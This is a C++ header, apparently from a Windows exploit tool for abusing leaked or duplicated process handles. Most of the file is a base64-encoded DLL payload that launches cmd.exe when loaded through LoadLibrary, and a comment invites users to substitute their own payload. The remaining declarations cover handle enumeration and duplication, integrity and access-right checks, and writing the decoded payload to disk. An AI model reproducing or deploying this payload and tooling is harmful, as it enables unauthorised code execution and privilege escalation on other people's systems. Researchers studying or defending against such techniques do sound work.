#pragma once
#include "ntdll.h"
#include <string>
#include <vector>
#include <iostream>
#include <Psapi.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <wincrypt.h>
#include <Zydis/Zydis.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Zydis.lib")

// DLL that calls CreateProcess to execute CMD; feel free to make your own payload for LoadLibrary
const std::string exploitThreadDllBase64{ "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SioAAKggAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwKQAAAAAAAIAqAAAAAAAAbCoAAAAAAACuKgAAAAAAAMoqAAAAAAAA6CoAAAAAAAD8KgAAAAAAAKIrAAAAAAAAjCsAAAAAAAByKwAAAAAAAFwrAAAAAAAARisAAAAAAAAsKwAAAAAAABArAAAAAAAAmioAAAAAAAAAAAAAAAAAALYrAAAAAAAAaCkAAAAAAABQKQAAAAAAAIgpAAAAAAAAAAAAAAAAAABAKgAAAAAAACgqAAAAAAAADCoAAAAAAADQKQAAAAAAAL4pAAAAAAAAsCkAAAAAAACkKQAAAAAAAOopAAAAAAAAAAAAAAAAAADuAENyZWF0ZVByb2Nlc3NXAABLRVJORUwzMi5kbGwAAAgAX19DX3NwZWNpZmljX2hhbmRsZXIAACUAX19zdGRfdHlwZV9pbmZvX2Rlc3Ryb3lfbGlzdAAAPgBtZW1zZXQAAFZDUlVOVElNRTE0MC5kbGwAADYAX2luaXR0ZXJtADcAX2luaXR0ZXJtX2UAPwBfc2VoX2ZpbHRlcl9kbGwAGABfY29uZmlndXJlX25hcnJvd19hcmd2AAAzAF9pbml0aWFsaXplX25hcnJvd19lbnZpcm9ubWVudAAANABfaW5pdGlhbGl6ZV9vbmV4aXRfdGFibGUAACIAX2V4ZWN1dGVfb25leGl0X3RhYmxlABYAX2NleGl0AABhcGktbXMtd2luLWNydC1ydW50aW1lLWwxLTEtMC5kbGwA6QRSdGxDYXB0dXJlQ29udGV4dADxBFJ0bExvb2t1cEZ1bmN0aW9uRW50cnkAAPgEUnRsVmlydHVhbFVud2luZAAA2AVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAJcFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyACoCR2V0Q3VycmVudFByb2Nlc3MAtgVUZXJtaW5hdGVQcm9jZXNzAACeA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAZARRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgArAkdldEN1cnJlbnRQcm9jZXNzSWQALwJHZXRDdXJyZW50VGhyZWFkSWQAAAEDR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUAgQNJbml0aWFsaXplU0xpc3RIZWFkAJcD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" };

class ElhHelper {
public:
    static HANDLE openProcessID(USHORT& uPID, DWORD dwDesiredAccess);
    static std::wstring getProcessName(HANDLE& hProcess);
    static std::wstring getProcessName(USHORT& uPID);
    static std::wstring getProcessImageFileName(HANDLE hProcess);
    static std::wstring getObjectName(HANDLE hObject, UCHAR objectTypeIndex);
    static DWORD getProcessIntegrity(HANDLE& hProcess);
    static DWORD getParentProcessID(HANDLE hProcess);
    static HANDLE duplicateHandle(SYSTEM_HANDLE_TABLE_ENTRY_INFO& handleInfo, HANDLE& hProcess);
    static bool accessContainsRights(DWORD dwGrantedAccess, DWORD dwAccessRights);
    static bool getModuleInfo(HMODULE hModule, DWORD64& baseAddr, DWORD64& moduleSize);
    static std::wstring getELHDirectory();
    static std::vector<BYTE> decodeBase64(const std::string& base64String);
    static bool writeDataToFile(const std::wstring& filePath, const std::vector<BYTE>& data);
    static DWORD64 findNullBytes(HMODULE hModule, int x);
};